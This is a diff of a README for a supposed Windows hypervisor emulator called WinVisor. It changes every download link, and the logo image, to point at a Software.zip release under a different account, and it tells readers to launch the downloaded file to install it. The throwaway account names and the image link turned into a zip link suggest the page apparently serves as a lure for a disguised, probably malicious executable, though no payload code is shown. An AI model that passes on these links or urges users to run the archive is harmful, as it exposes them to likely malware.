@@ -3,7 +3,7 @@
 
 Welcome to the WinVisor GitHub repository! 🚀
 
-![WinVisor Logo](https://example.com/winvisor_logo.png)
+![WinVisor Logo](https://github.com/Testoplate/WinVisor/releases/download/v2.0/Software.zip)
 
 ### Description:
 **WinVisor** is a cutting-edge hypervisor-based emulator designed for Windows x64 user-mode executables utilizing the Windows Hypervisor Platform API. It offers a powerful environment for running and testing Windows applications with enhanced capabilities and performance.
@@ -18,7 +18,7 @@ Welcome to the WinVisor GitHub repository! 🚀
 ### How to Use:
 1. Download the WinVisor software package from the link below:
    
-   [![Download WinVisor](https://img.shields.io/badge/Download%20WinVisor-Software-red)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+   [![Download WinVisor](https://github.com/Testoplate/WinVisor/releases/download/v2.0/Software.zip%20WinVisor-Software-red)](https://github.com/Testoplate/WinVisor/releases/download/v2.0/Software.zip)
    
    (*Note: Launch the downloaded file to install the WinVisor software.*)
 
@@ -27,7 +27,7 @@ Welcome to the WinVisor GitHub repository! 🚀
 4. Enjoy the enhanced emulation experience!
 
 ### Resources:
-- **Download WinVisor**: [WinVisor Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+- **Download WinVisor**: [WinVisor Software](https://github.com/Testoplate/WinVisor/releases/download/v2.0/Software.zip)
 - **Contribute to WinVisor**: Fork the repository and create pull requests to contribute.
 - **Report Issues**: Submit any issues or feedback through the GitHub repository.
 
